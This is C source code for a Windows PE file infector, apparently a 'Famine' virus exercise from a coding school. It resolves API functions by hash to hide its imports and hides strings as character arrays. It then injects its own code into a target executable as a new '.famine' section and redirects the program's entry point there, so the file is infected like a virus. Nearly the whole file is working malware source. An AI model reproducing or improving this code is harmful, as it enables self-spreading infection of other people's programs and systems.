#define WIN32_LEAN_AND_MEAN // Exclude rarely-used stuff from Windows headers

#pragma warning( disable : 4201 ) // Disable warning about 'nameless struct/union'

#include "GetProcAddressWithHash.h"
#include "famine.h"
// #include <Windows.h> // only for types
#define MAX_PATH 260

 void	*memcpy(void *dst, const void *src, size_t n)
{
	size_t i;

	if (!dst && !src)
		return (0);
	i = 0;
	while (i < n)
	{
		((unsigned char *)dst)[i] = ((unsigned char *)src)[i];
		i++;
	}
	return (dst);
}



int ft_strncmp(const char *s1, const char *s2, unsigned int n)
{
    unsigned int i;

    i = 0;
    if (n == 0)
        return (0);
    while (s1[i] == s2[i] && s1[i] != '\0' && s2[i] != '\0' && i < n - 1)
        i++;
    return ((unsigned char)s1[i] - (unsigned char)s2[i]);
}


void	*memstr(char *s, const char *str, size_t n) {
	size_t i;

	i = 0;
	while (i++ < n)
	{
		if (ft_strncmp((const char *)s, str, n) == 0)
			return ((void *)s);
		s++;
	}
	return (NULL);
}

DWORD align(DWORD size, DWORD align, DWORD addr)
{
    if (!(size % align))
        return addr + size;
    return addr + (size / align + 1) * align;
}

// Structure for handling PE injection
typedef struct woody
{
    char *target;
    HANDLE file_handle;
    HANDLE file_mapping;
    LPVOID file_view;
    DWORD file_size;
    PIMAGE_NT_HEADERS nt_headers;
    PIMAGE_SECTION_HEADER section_headers;
    WORD number_of_sections;

    PCHAR shellcode;
    DWORD shellcode_size;
} woody;

// VOID clean_woody(woody *injector)
// {
//     if (injector->file_view)
//         UnmapViewOfFile(injector->file_view);
//     if (injector->file_mapping)
//         CloseHandle(injector->file_mapping);
//     if (injector->file_handle != INVALID_HANDLE_VALUE)
//         CloseHandle(injector->file_handle);
// }


s_procedure_mapping procedure_map()
{
    s_procedure_mapping procedure_mapping;
    WCHAR sKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l' };
    UNICODE_STRING uString = { 0 };

    procedure_mapping.error = TRUE;

    // Resolve LdrLoadDll and LdrGetProcAddress
    procedure_mapping.pLdrLoadDll = GetProcAddressWithHash(LDRLOADDLL_HASH);
    procedure_mapping.pLdrGetProcAddress = GetProcAddressWithHash(LDRGETPROCADDRESS_HASH);
    if (!procedure_mapping.pLdrLoadDll || !procedure_mapping.pLdrGetProcAddress)
    {
        ERROR_SYS("GetProcAddress");
        return procedure_mapping;
    }

    // Load kernel32.dll
    uString.Buffer = sKernel32;
    uString.Length = sizeof(sKernel32);
    uString.MaximumLength = sizeof(sKernel32);

    procedure_mapping.pLdrLoadDll(NULL, 0, &uString, &procedure_mapping.hKernel32);
    if (!procedure_mapping.hKernel32)
    {
        ERROR_SYS("LdrLoadDll");
        return procedure_mapping;
    }

    procedure_mapping.pCreateFileA = (CREATEFILEA)GetProcAddressWithHash(CREATEFILEA_HASH);
    procedure_mapping.pGetFileSize = (GETFILESIZE)GetProcAddressWithHash(GETFILESIZE_HASH);
    procedure_mapping.pCreateFileMappingA = (CREATEFILEMAPPINGA)GetProcAddressWithHash(CREATEFILEMAPPINGA_HASH);
    procedure_mapping.pMapViewOfFile = (MAPVIEWOFFILE)GetProcAddressWithHash(MAPVIEWOFFILE_HASH);
    procedure_mapping.pCloseHandle = (CLOSEHANDLE)GetProcAddressWithHash(CLOSEHANDLE_HASH);
    procedure_mapping.pGetModuleFileNameA = (GETMODULEFILENAMEA)GetProcAddressWithHash(GETMODULEFILENAMEA_HASH);

    if (!procedure_mapping.pCreateFileA || !procedure_mapping.pGetFileSize || !procedure_mapping.pCreateFileMappingA
    || !procedure_mapping.pMapViewOfFile || !procedure_mapping.pCloseHandle || !procedure_mapping.pGetModuleFileNameA)
    {
        ERROR_SYS("GetProcAddress for kernel32");
        return procedure_mapping;
    }

    procedure_mapping.error = FALSE;
    return procedure_mapping;
}

s_file_mapping map_file(PCHAR path, s_procedure_mapping proc, BOOLEAN write)
{
    s_file_mapping file_mapping;
    file_mapping.error = TRUE;
    DWORD access;

    if (write)
        access = GENERIC_WRITE | GENERIC_READ;
    else
        access = GENERIC_READ;


    file_mapping.file_handle = proc.pCreateFileA(path, access, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file_mapping.file_handle == INVALID_HANDLE_VALUE)
    {
        ERROR_SYS("CreateFileA");
        return file_mapping;
    }

    file_mapping.file_size = proc.pGetFileSize(file_mapping.file_handle, NULL);
    if (file_mapping.file_size == INVALID_FILE_SIZE)
    {
        ERROR_SYS("GetFileSize");
        // clean_woody(injector);
        return file_mapping;
    }

    if (write)
        access = PAGE_READWRITE;
    else
        access = PAGE_READONLY;
    

    file_mapping.file_mapping = proc.pCreateFileMappingA(file_mapping.file_handle, NULL, access, 0, file_mapping.file_size, NULL);
    if (!file_mapping.file_mapping)
    {
        ERROR_SYS("CreateFileMappingA");
        // clean_woody(injector);
        return file_mapping;
    }

    if (write)
        access = FILE_MAP_ALL_ACCESS;
    else
        access = FILE_MAP_READ;

    file_mapping.file_view = proc.pMapViewOfFile(file_mapping.file_mapping, access, 0, 0, file_mapping.file_size);
    if (!file_mapping.file_view)
    {
        ERROR_SYS("MapViewOfFile");
        // clean_woody(injector);
        return file_mapping;
    }

    file_mapping.error = FALSE;
    return file_mapping;
}


t_pe read_pe_header(s_file_mapping pe_map)
{
    t_pe pe;
    pe.error = TRUE;

    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)pe_map.file_view;
    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
    {
        ERROR_SYS("Invalid DOS signature");
        return pe;
    }

    pe.nt_headers = (PIMAGE_NT_HEADERS)((BYTE *)pe_map.file_view + dos_header->e_lfanew);
    if (pe.nt_headers->Signature != IMAGE_NT_SIGNATURE)
    {
        ERROR_SYS("Invalid NT signature");
        return pe;
    }

    if (pe.nt_headers->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64)
    {
        ERROR_SYS("Unsupported architecture (64-bit only)");
        return pe;
    }

    if (!(pe.nt_headers->FileHeader.Characteristics & IMAGE_FILE_EXECUTABLE_IMAGE))
    {
        ERROR_SYS("File is not executable");
        return pe;
    }

    pe.number_of_sections = pe.nt_headers->FileHeader.NumberOfSections;
    pe.section_headers = IMAGE_FIRST_SECTION(pe.nt_headers);
    pe.error = FALSE;
    return pe;
}

PIMAGE_SECTION_HEADER get_section_by_name(s_file_mapping file_mapping)
{
    char famine_section_name[] = {'.', 'f', 'a', 'm', 'i', 'n', 'e', 0};
    char text_section_name[] = {'.', 't', 'e', 'x', 't', 0, 0, 0};

    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)file_mapping.file_view;
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((BYTE *)file_mapping.file_view + dos_header->e_lfanew);
    PIMAGE_SECTION_HEADER section_headers = IMAGE_FIRST_SECTION(nt_headers);

    // First, look for .famine section
    for (WORD i = 0; i < nt_headers->FileHeader.NumberOfSections; i++)
    {
        if (ft_strncmp(section_headers[i].Name, famine_section_name, SECTION_NAME_SIZE) == 0)
            return &section_headers[i];
    }

    // If .famine is not found, look for .text section
    for (WORD i = 0; i < nt_headers->FileHeader.NumberOfSections; i++)
    {
        if (ft_strncmp(section_headers[i].Name, text_section_name, SECTION_NAME_SIZE) == 0)
            return &section_headers[i];
    }

    // If neither section is found, return NULL
    return NULL;
}


VOID inject_shellcode(s_file_mapping itself_map, s_file_mapping target_map)
{
    t_pe pe;
    char section_name[] = {'.', 'f', 'a', 'm', 'i', 'n', 'e', 0};

    // Retrieve the .text section from the 'itself' file (shellcode)
    PIMAGE_SECTION_HEADER itself_section = get_section_by_name(itself_map);
    if (!itself_section)
    {
        ERROR_SYS("Itself section not found");
        return;
    }

    // Read the target PE headers
    pe = read_pe_header(target_map);
    if (pe.error)
    {
        ERROR_SYS("Read PE header");
        return;
    }

    // Get alignments from the target PE file headers
    DWORD file_alignment = pe.nt_headers->OptionalHeader.FileAlignment;
    DWORD section_alignment = pe.nt_headers->OptionalHeader.SectionAlignment;

    // Calculate the new section's RVA (Relative Virtual Address)
    DWORD new_section_rva = align(pe.section_headers[pe.number_of_sections - 1].VirtualAddress +
                                  pe.section_headers[pe.number_of_sections - 1].Misc.VirtualSize,
                                  section_alignment, 0);

    // Calculate the new section's raw size and virtual size
    DWORD new_section_virtual_size = align(itself_section->Misc.VirtualSize, section_alignment, 0);
    DWORD new_section_raw_size = align(itself_section->SizeOfRawData, file_alignment, 0);

    // Setup the new section with calculated values
    PIMAGE_SECTION_HEADER new_section = &pe.section_headers[pe.number_of_sections];
    memcpy(new_section->Name, section_name, sizeof(section_name));
    new_section->VirtualAddress = new_section_rva;
    new_section->Misc.VirtualSize = new_section_virtual_size;
    new_section->SizeOfRawData = new_section_raw_size;

    new_section->PointerToRawData = align(pe.section_headers[pe.number_of_sections - 1].PointerToRawData +
                                          pe.section_headers[pe.number_of_sections - 1].SizeOfRawData,
                                          file_alignment, 0);

    // Set the section's characteristics (e.g., executable and readable)
    new_section->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;

    // Update the number of sections and size of the image
    pe.nt_headers->OptionalHeader.SizeOfImage = new_section_rva + new_section_virtual_size;
    pe.nt_headers->FileHeader.NumberOfSections++;

    // Copy the shellcode from 'itself' to the new section in the target
    memcpy((BYTE *)target_map.file_view + new_section->PointerToRawData,
              (BYTE *)itself_map.file_view + itself_section->PointerToRawData,
              itself_section->Misc.VirtualSize);

    // Correct way to set the new entry point
    DWORD old_entry_point = pe.nt_headers->OptionalHeader.AddressOfEntryPoint;
    pe.nt_headers->OptionalHeader.AddressOfEntryPoint = new_section_rva;

    // Patch the shellcode with the old entry point
    DWORD *shellcode_entry = (DWORD *)((BYTE *)target_map.file_view + new_section->PointerToRawData);
    *shellcode_entry = old_entry_point;

    // Expand the file size to account for the new section
    target_map.file_size += new_section_raw_size;
}


BOOLEAN is_infected(s_file_mapping file_mapping)
{
    char SIGNATURE[] = {'F', 'a', 'm', 'i', 'n', 'e', ' ', 'b', 'y', ' ', 'W', 'o', 'o', 'd', 'y', 0};
    const char *file_content = (const char *)file_mapping.file_view;

    if(memstr(file_content, SIGNATURE, sizeof(SIGNATURE)))
        return TRUE;

    return FALSE;
}


VOID inject_shellcode_pe(PCHAR target)
{
    char exePath[MAX_PATH];
    s_procedure_mapping proc;
    s_file_mapping itself_map;
    s_file_mapping target_map;

    proc = procedure_map(target);
    if (proc.error) return ;

    DWORD pathlen = proc.pGetModuleFileNameA(NULL, exePath, MAX_PATH);
    if (pathlen == 0) return ;

    itself_map = map_file(exePath, proc, FALSE);
    if (itself_map.error) return ;

    target_map = map_file(target, proc, TRUE);
    if (target_map.error) return ;

    if (is_infected(target_map)) // dont work
        return;

    inject_shellcode(itself_map, target_map);
}

VOID Run(VOID)
{
    #pragma warning( push )
    #pragma warning( disable : 4055 ) // Ignore cast warnings

    char target[] = {'t', 'e', 's', 't', '.', 'e', 'x', 'e', 0};
    inject_shellcode_pe(target);
}

// int main()
// {
//     Run();
//     return 0;
// }